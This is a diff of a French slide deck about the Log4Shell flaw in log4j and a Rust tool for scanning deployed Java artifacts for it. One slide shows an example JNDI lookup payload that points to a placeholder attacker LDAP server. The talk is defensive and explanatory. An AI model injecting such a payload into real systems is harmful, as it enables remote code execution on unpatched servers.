@@ -18,7 +18,7 @@ class: invert
 - twitter : [@skarboune]()
 ---
 
-# Mutuelle de poitiers assurance
+# Mutuelle de Poitiers Assurance
 <!-- Comme toutes les banques / assurances, à la mdpa, nous aimons développez en java  -->
 <!-- Nous faisons des batchs, des applications et nous avons même des progiciels utilisant java -->
 :heart: Java => Application, Progiciel, Batch, etc ...
@@ -27,11 +27,30 @@ class: invert
 
 ---
 
-# Puis, le 9/12/2021
+# Puis, le 9/12/2021  
 
-## Une faille dans log4j est découverte.
+## Une faille Zero day  est découverte dans log4j.
+
+La CVE-2021-44228 appelé aussi Log4shell.
+
+---
+
+# C'est quoi Log4j ?
+
+Log4j est le premier framework de gestion des logs à avoir été créé pour la plateforme java : 
+- Formatage de sortie
+- Type de sortie : Console, Fichiers, etc... 
+
+![ fit vertical](img/console-output.png)
+
+---
+# Et la faille ?
 
 -  Une classe distante peut être exécutée via une faille dans le moteur d'interpolation de Log4j2.
+
+````
+${jndi:ldap://serveur_pirate/message_malveillant}
+````
 
 ![](https://media.giphy.com/media/MM0Jrc8BHKx3y/giphy.gif)
 
@@ -39,15 +58,15 @@ Est-ce que nous avons cette faille dans notre SI ?
  
 ---
 
-# check des dépendances ?
+# Comment détecter la faille ?
 
-Via nos outils de builds (maven, gradle) ?
+- Une recherche sur tous nos projets ? 💥
+<!-- Sauf que les librairies peuvent être tirées par transitivité ... -->
+- Nos outils de builds (maven, gradle) ? 
 
-## Sauf que nous avons beaucoup de projet...
+## Sauf que nous avons beaucoup de projet... 💥
 
- Plus de 100 projets en tout.
-
-
+ <!-- Plus de 100 projets en tout. -->
 
 Et en plus certains projets sont spéciaux. Par exemple : il rajoute des librairies en dehors du gestionnaire des dépendances. 
 <!-- Sachant que nous avons des projets spéciaux. Certains de ces projets par exemple rajoute des librairies en dehors du gestionnaire de dépendances. -->
@@ -60,7 +79,7 @@ Et en plus certains projets sont spéciaux. Par exemple : il rajoute des librair
 
 Pipeline : les artifacts sont copiés sur un file system.
 Et si on parsait, nos livrables ?
-
+<!-- Les wars, jars etc... ne sont que des ZIPs... -->
 ---
 # Aller on crée un cli
 
@@ -182,7 +201,7 @@ Tu l'as exécuté dans le répertoire des wars ?
 
 --- 
 
-Donc, on décide que le ops puisse définir toutes les options 
+Donc, on décide que l'ops puisse définir toutes les options 
 
 ![](img/clap.png)
 
@@ -238,6 +257,7 @@ Ben, il n'y a plus qu'à analyser et prendre nos dispositions :smile:
 
 # En conclusion
 
+- ⚠ Attention aux librairies que l'on utilise. (Exemple récent : [color js](https://securityboulevard.com/2022/01/npm-libraries-colors-and-faker-sabotaged-in-protest-by-their-maintainer-what-to-do-now/) )
 - Cli facilement réalisable en Rust.
 - Programmes performants sans utiliser des fonctionnalités avancées.
 - Eco Système à la Npm.
